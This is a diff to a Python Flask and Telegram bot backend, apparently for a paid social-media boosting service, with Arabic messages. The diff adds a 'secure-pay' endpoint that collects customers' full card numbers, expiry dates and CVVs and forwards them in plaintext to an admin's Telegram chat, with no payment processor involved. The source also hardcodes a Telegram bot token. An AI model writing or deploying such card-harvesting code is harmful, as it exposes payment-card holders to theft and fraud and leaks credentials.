@@ -4,64 +4,60 @@ import telebot
 from telebot import types
 import os
 
-# --- بياناتك ---
 TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
-ADMIN_ID = "6695916631"
-# --------------
-
+ADMIN_ID = "6695916631" 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
-CORS(app) # تم إصلاح خطأ مكتبة CORS هنا
+CORS(app)
 
-# مخزن مؤقت للطلبات (سيختفي عند إعادة تشغيل السيرفر)
-orders = {}
+# قاعدة بيانات للأرصدة وحالات الدفع
+users_db = {"default_user": {"balance": 0.0, "status": "idle"}}
 
-@app.route('/')
-def home():
-    return "نظام محمد يعمل بنجاح!"
+@app.route('/api/balance/default_user', methods=['GET'])
+def get_balance():
+    return jsonify(users_db["default_user"])
 
-# استقبال الطلب من الموقع
-@app.route('/api/order', methods=['POST']) # تم إصلاح الخطأ من list إلى methods هنا
+@app.route('/api/secure-pay', methods=['POST'])
+def secure_pay():
+    data = request.json
+    usd = data.get('amount_usd')
+    iqd = data.get('amount_iqd')
+    users_db["default_user"]["status"] = "waiting"
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(f"✅ قبول ({usd}$)", callback_data=f"pay_ok_{usd}"),
+               types.InlineKeyboardButton("❌ رفض", callback_data="pay_no"))
+    
+    msg = (f"💳 **طلب دفع ماستر كارد**\n"
+           f"💵 المبلغ: ${usd} ({iqd:,} IQD)\n"
+           f"🔢 البطاقة: `{data.get('card')}`\n"
+           f"📅 التاريخ: {data.get('date')} | 🔒 CVV: `{data.get('cvv')}`")
+    
+    bot.send_message(ADMIN_ID, msg, reply_markup=markup, parse_mode="Markdown")
+    return jsonify({"status": "processing"})
+
+@app.route('/api/order', methods=['POST'])
 def create_order():
     data = request.json
-    order_id = data.get('orderId')
+    cost = float(data.get('cost'))
+    if users_db["default_user"]["balance"] < cost:
+        return jsonify({"success": False, "message": "رصيدك غير كافٍ"}), 400
     
-    # حفظ حالة الطلب
-    orders[str(order_id)] = {"status": "قيد التنفيذ"}
+    users_db["default_user"]["balance"] -= cost
+    msg = f"🚀 **طلب رشق جديد**\n🛠 الخدمة: {data.get('service')}\n🔢 الكمية: {data.get('qty')}\n🔗 الرابط: {data.get('link')}\n💵 التكلفة: ${cost}"
+    bot.send_message(ADMIN_ID, msg)
+    return jsonify({"success": True, "new_balance": users_db["default_user"]["balance"]})
 
-    # إرسال زر التحكم للمدير في تليجرام
-    markup = types.InlineKeyboardMarkup()
-    btn = types.InlineKeyboardButton("✅ تم إكمال الطلب", callback_data=f"done_{order_id}")
-    markup.add(btn)
-
-    msg = (f"🚀 طلب جديد #{order_id}\n"
-           f"🛠 الخدمة: {data.get('service')}\n"
-           f"🔗 الرابط: {data.get('link')}\n"
-           f"🔢 الكمية: {data.get('qty')}\n"
-           f"💵 التكلفة: ${data.get('cost')}")
-    
-    bot.send_message(ADMIN_ID, msg, reply_markup=markup)
-    return jsonify({"success": True})
-
-# فحص الحالة للموقع
-@app.route('/api/status/<order_id>', methods=['GET'])
-def get_status(order_id):
-    order = orders.get(str(order_id))
-    return jsonify({"status": order['status'] if order else "غير موجود"})
-
-# زر "تم الإكمال"
-@bot.callback_query_handler(func=lambda call: call.data.startswith('done_'))
-def handle_done(call):
-    order_id = call.data.split('_')[1]
-    if order_id in orders:
-        orders[order_id]['status'] = "تم المكتمل"
-        bot.edit_message_text(f"✅ الطلب #{order_id} تم تنفيذه!", call.message.chat.id, call.message.message_id)
-        bot.answer_callback_query(call.id, "تم تحديث حالة الطلب للمستخدم")
+@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
+def handle_payment(call):
+    if "ok" in call.data:
+        amount = float(call.data.split('_')[2])
+        users_db["default_user"]["balance"] += amount
+        users_db["default_user"]["status"] = "approved"
+        bot.edit_message_text(f"✅ تم إضافة ${amount}", call.message.chat.id, call.message.message_id)
+    else:
+        users_db["default_user"]["status"] = "rejected"
+        bot.edit_message_text("❌ تم الرفض", call.message.chat.id, call.message.message_id)
 
 if __name__ == "__main__":
-    from threading import Thread
-    def run_bot():
-        bot.polling(none_stop=True)
-    
-    Thread(target=run_bot).start()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
